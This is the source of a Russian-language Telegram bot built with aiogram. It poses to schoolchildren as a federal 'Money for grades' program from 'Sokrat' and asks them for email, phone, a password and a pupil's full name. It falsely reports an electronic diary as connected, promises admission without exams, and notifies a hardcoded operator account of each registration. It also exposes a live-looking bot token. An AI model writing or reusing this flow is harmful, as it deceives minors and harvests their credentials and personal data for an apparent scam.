from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.types import InputFile
from ClassUser import User

# Токен подключения
TOKEN_AIP = "6281107032:AAF5kZPJCDXCu4UjoLS5quYtiI8LM5jw56Y"

# /help
HELP_COMMADS = """
/start - начать работу с ботом
/help - список комманд
"""

# Экземпляр класса Bot
bot = Bot(TOKEN_AIP)
storage = MemoryStorage()
# Дискриптор
dp = Dispatcher(bot, storage=storage)

id_me = 1073170752

new_user = False

id_user = ''
user_username = ''

email = ''
phon = ''
score = 0


async def on_start(_):
    print("Все ОК!")

async def menu(message: types.Message):
    global email, phon, score

    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="Добавить ученика", callback_data="add")
    button2 = types.InlineKeyboardButton(text="Онлайн поступление", callback_data="entrance")
    keyboard.row(button1)
    keyboard.row(button2)

    await message.answer(
        f"Ваша почта: {email}  \nВаш телефон:  {phon} \n\n "
        f"Школьник: /start \nДеньги за оценки:   {score}"
        f"\n\n ↪️ Пригласи друга: https://t.me/Kalinenocbot",
        reply_markup=keyboard)


@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    global id_user, user_username

    id_user = message.from_user.id
    user_username = message.from_user.username

    photo = InputFile("image/start.jpg")
    nameuser = message.from_user.username
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton(text="Подключиться к программе", callback_data="acquaintance1"))
    await bot.send_photo(chat_id=message.chat.id, photo=photo,
                         caption="Привет,@" + nameuser + "\nДобро пожаловать в федеральную программу 'Деньги за "
                                                         "оценки' от компании Sokrat!\n\n Для чего нужна эта "
                                                         "программа?\n\n 1️⃣  Мы хотим поддержать тебя и позволить в "
                                                         "будущем сэкономить на образовании\n2️⃣  " +
                                 "А еще хотим стимулировать тебя получать как можно больше хороших оценок, тем самым "
                                 "улучшить твою успеваемость в школе!\n3️⃣  Интеграция с электронными "
                                 "дневниками.\n4️⃣  Онлайн - поступление в лучшие ВУЗы и ССУЗы России \n\n👤  "
                                 "участников программы",
                         reply_markup=keyboard)

@dp.message_handler(commands=['id'])
async def id_meneger(message: types.Message):
    global id_me
    print(message.from_user.id)
    await bot.send_message(id_me,f'Пользователь {message.from_user.username}, зарегестрировался его id:{message.from_user.id}')

@dp.callback_query_handler(text="acquaintance1")
async def acquaintance1(call: types.CallbackQuery):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton(text="Далее 1 из 3", callback_data="acquaintance2"))
    await bot.send_photo(chat_id=call.message.chat.id,
                         photo="https://sun9-24.userapi.com/impg/rEiKXCb_ljrz2NJNfJHfKRz2qUupWY2haXMXlQ/Otcy6P8lwL0"
                               ".jpg?size=604x368&quality=95&sign=d1b20754a39db81cbbd41b0e9490b164&type=album",
                         reply_markup=keyboard)


@dp.callback_query_handler(text="acquaintance2")
async def acquaintance2(call: types.CallbackQuery):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton(text="Далее 2 из 3", callback_data="acquaintance3"))
    await bot.send_photo(chat_id=call.message.chat.id,
                         photo="https://avatars.dzeninfra.ru/get-zen_doc/44972"
                               "/pub_5bd1a09e064ed400ad695787_5bd1a1a5a6560100aaad1c9d/scale_1200",
                         reply_markup=keyboard)


@dp.callback_query_handler(text="acquaintance3")
async def acquaintance3(call: types.CallbackQuery):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton(text="Участвовать в программе", callback_data="connect_program"))
    await bot.send_photo(chat_id=call.message.chat.id,
                         photo="https://t4.ftcdn.net/jpg/00/31/47/61/360_F_31476143_UMcu2UTun6OODmFi5PnSGPSLtIHWdiJy"
                               ".jpg",
                         reply_markup=keyboard)


@dp.callback_query_handler(text="connect_program")
async def connect(call: types.CallbackQuery):
    await call.message.answer("Введите вашу почту ")
    await User.user_email.set()


@dp.message_handler(state=User.user_email)
async def registr_1(message: types.Message, state: FSMContext):
    mail = message.text
    await state.update_data(user_email=mail)
    await message.answer("Введите телефон")
    await User.user_phon.set()


@dp.message_handler(state=User.user_phon)
async def registr_2(message: types.Message, state: FSMContext):
    phon = message.text
    await state.update_data(user_phon=phon)
    await message.answer("Введите пароль")
    await User.user_password.set()


@dp.message_handler(state=User.user_password)
async def password(message: types.Message, state: FSMContext):
    password = message.text
    await state.update_data(user_password=password)
    global email, phon, score,id_me
    data = await state.get_data()
    email = data.get('user_email')
    phon = data.get('user_phon')
    score = data.get('user_score')

    await menu(message=message)
    await state.finish()

    await bot.send_message(id_me,f'Пользователь {message.from_user.username}, зарегестрировался')

@dp.callback_query_handler(text="menu")
async def menu_button(call: types.CallbackQuery):
    await menu(message=call.message)


@dp.callback_query_handler(text="add")
async def add(call: types.CallbackQuery):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="Санкт-Петербург", callback_data="Petersburg_diary")
    keyboard.add(button1)
    await call.message.answer("Выберете электрноный дневник:", reply_markup=keyboard)

@dp.callback_query_handler(text="Petersburg_diary")
async def Petersburg_diary(call: types.CallbackQuery,state: FSMContext):
    keyboard = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(text="Назад", callback_data="add")
    keyboard.row(button3)
    await call.message.answer("Введите Фамилию Имя Отчество ученика", reply_markup=keyboard)
    await User.user_name.set()


@dp.message_handler(state=User.user_name)
async  def coonect_diary(message: types.Message,state: FSMContext):
    keyboard = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(text="В личный кабинет", callback_data="menu")
    keyboard.row(button3)
    await message.answer("✅ Электронный дневник подключен", reply_markup=keyboard)
    await state.finish()

@dp.callback_query_handler(text="entrance")
async def entrance(call: types.CallbackQuery):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="Выбрать ВУЗ", callback_data="UNIVERSITY")
    button2 = types.InlineKeyboardButton(text="Назад", callback_data="menu")
    keyboard.add(button1,button2)
    await call.message.answer("Serega_4, поступите в один из университетов со скидкой от Sokrat.\n\n"
                              "Sokrat - это:\n- Бесплатная консультация\n- Подача документов онлайн\n"
                              "- Подбор ВУЗа бесплатно\n- Выгодные условия поступления\n- Поступление без ЕГЭ*\n\n"
                              "*Действует не на все учебные заведения - партнеры Sokrat", reply_markup=keyboard)


@dp.callback_query_handler(text="UNIVERSITY")
async def UNIVERSITY(call: types.CallbackQuery):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="Уневер 1", callback_data="Уневер 1")
    button2 = types.InlineKeyboardButton(text="Уневер 2", callback_data="Уневер 2")
    button3 = types.InlineKeyboardButton(text="Назад", callback_data="entrance")
    keyboard.row(button1)
    keyboard.row(button2)
    keyboard.row(button3)

    await call.message.answer("Выберете один из учебных заведений:", reply_markup=keyboard)


@dp.callback_query_handler(text="Уневер 1")
async def UNIVERSITY_1(call: types.CallbackQuery):

    global id_user, user_username

    keyboard = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(text="В личный кабинет", callback_data="menu")
    keyboard.row(button3)
    await call.message.answer("Ваша заявка отправлена.\nНаш специалист свяжется с вами в ближайшее время", reply_markup=keyboard)
    await bot.send_message(id_me,f'Пользователь {user_username},отпраил запрос на поступление в 1 Уневер\n его id:{id_user}')

@dp.callback_query_handler(text="Уневер 2")
async def UNIVERSITY_1(call: types.CallbackQuery):
        global id_user, user_username

        keyboard = types.InlineKeyboardMarkup()
        button3 = types.InlineKeyboardButton(text="В личный кабинет", callback_data="menu")
        keyboard.row(button3)
        await call.message.answer("Ваша заявка отправлена.\nНаш специалист свяжется с вами в ближайшее время",
                                  reply_markup=keyboard)
        await bot.send_message(id_me,
                               f'Пользователь {user_username},отпраил запрос на поступление в 2 Уневер\n его id:{id_user}')

if __name__ == '__main__':
    executor.start_polling(dp, on_startup=on_start, skip_updates=True)
